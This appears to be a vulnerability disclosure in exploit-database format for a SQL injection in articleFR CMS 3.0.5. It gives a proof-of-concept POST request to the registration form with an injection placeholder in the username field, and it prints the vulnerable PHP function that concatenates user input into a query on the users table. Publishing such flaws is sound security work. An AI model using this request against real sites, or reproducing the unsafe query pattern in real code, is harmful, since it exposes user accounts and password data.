@@ -1,0 +1,50 @@
+# Exploit Title: SQL injection vulnerability in articleFR CMS 3.0.5
+# Google Dork: N/A
+# Date: 01/21/2015
+# Exploit Author: Tran Dinh Tien (tien.d.tran@itas.vn) & ITAS Team (www.itas.vn)
+# Vendor Homepage: http://freereprintables.com
+# Software Link: https://github.com/articlefr/articleFR
+# Version: version 3.0.5 
+# Tested on: Linux
+# CVE : N/A
+
+::PROOF OF CONCEPT::
+
+- REQUEST:
+
+POST /articlefr/register/ HTTP/1.1
+Host: target.org
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://target.org/articlefr/register/
+Cookie: _ga=GA1.2.884814947.1419214773; __unam=bd22dea-14a6fcadd31-42cba495-31; GEAR=local-5422433b500446ead50002d4; PHPSESSID=8a9r8t1d5g9veogj6er9fvev63; _gat=1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+
+username=[SQL INJECTION HERE]&email=test2%40itas.vn&name=test&password=123123&submit=register
+
+- Vulnerable file: articleFR/system/profile.functions.php
+- Vulnerable parameter: username
+- Query: SELECT id, username, name, password, email, website, blog, date, isactive, activekey, membership FROM users WHERE username ='[Injection HERE]'
+- Vulnerable function:
+function getProfile($_username, $_connection) {
+$_q = "SELECT id, username, name, password, email, website, blog, date, isactive, activekey, membership FROM users WHERE username = '" . $_username . "'";
+$_result = single_resulti($_q, $_connection);
+
+$_retval['id'] = $_result['id'];
+$_retval['name'] = $_result['name'];
+$_retval['username'] = $_result['username'];
+$_retval['password'] = $_result['password'];
+$_retval['email'] = $_result['email'];
+$_retval['website'] = $_result['website'];
+$_retval['blog'] = $_result['blog'];
+$_retval['date'] = $_result['date'];
+$_retval['isactive'] = $_result['isactive'];
+$_retval['activekey'] = $_result['activekey'];
+$_retval['membership'] = $_result['membership'];
+
+return $_retval;
+}
